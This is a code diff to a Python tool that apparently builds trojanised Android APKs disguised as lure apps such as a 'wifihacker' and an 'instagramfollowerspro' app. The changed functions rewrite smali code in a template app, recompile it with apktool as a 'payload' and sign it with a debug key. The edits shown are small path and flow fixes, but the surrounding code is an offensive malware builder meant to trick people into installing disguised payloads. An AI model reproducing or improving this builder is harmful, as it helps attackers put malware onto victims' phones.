@@ -63,7 +63,7 @@ def execute(command):
         	from halo import Halo
         	spinner = Halo(text=f'Running {G+command}',spinner= 'dots')
         	spinner.start()
-        	a = os.system(command+" > log.txt 2>&1")
+        	a = os.system(command+" > ~/log.txt 2>&1")
         	spinner.stop()
         	if a == 0:
         		return None
@@ -95,6 +95,8 @@ def check(com):
 	from shutil import which 
 	a = which(com, mode = os.F_OK | os.X_OK, path = None)
 	if a == None:
+		if com == "apktool":
+			return 
 		return error1(f"{R}Command {G+UNDERLINE+com+END+R} not found",2)
 	else:
 		pass
@@ -1111,7 +1113,7 @@ def build_wifihacker():
     iget-object v0, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;
 
     iget-object v1, p0, Lcom/wifihacker/PassActivity$1;->this$0:Lcom/wifihacker/PassActivity;
-0
+
     invoke-static {v1}, Lcom/wifihacker/PassActivity;->access$1(Lcom/wifihacker/PassActivity;)Landroid/content/Intent;
 
     move-result-object v1
@@ -1135,10 +1137,11 @@ def build_wifihacker():
     invoke-virtual {v0, v1}, Landroid/widget/TextView;->setVisibility(I)V
 
     goto :goto_0
-.end method'''
+.end method
+'''
 	os.system("rm -rf android_payload.apk android_payload normal_apk 1 final.apk tmp.sh > /dev/null 2>&1")
-	os.system("cp -r lib/wifihacker normal_apk")
-	makeFile(f"{pwd}/normal_apk/smali_classes3/com/wifihacker//PassActivity$1.smali", passact)	
+	os.system(f"cp -r {pwd}/lib/wifihacker normal_apk")
+	makeFile(f"{pwd}/normal_apk/smali_classes3/com/wifihacker/PassActivity$1.smali", passact)	
 	makeFile(f"{pwd}/normal_apk/res/values/strings.xml",stringsxml)	
 	if ok == "y":
 		os.system(f'cp {icon} {pwd}/normal_apk/res/drawable-xhdpi/app_icon.png')
@@ -1198,6 +1201,7 @@ def build_wifihacker():
 	message ("Compliling Payload")
 	os.chdir(f"normal_apk")
 	execute("apktool b -o final.apk")
+
 	message ("Signing Apk")
 	os.system("keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -addprovider SunPKCS11")
 	os.system('jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA final.apk androiddebugkey > /dev/null 2&>1')	
@@ -1568,6 +1572,7 @@ def executeMain():
 		build_instagramfollowerspro()
 	if a == "2":
 		build_wifihacker()
+		exit(0)
 	if a == "5":
 		build_sara()
 	elif a == "6":
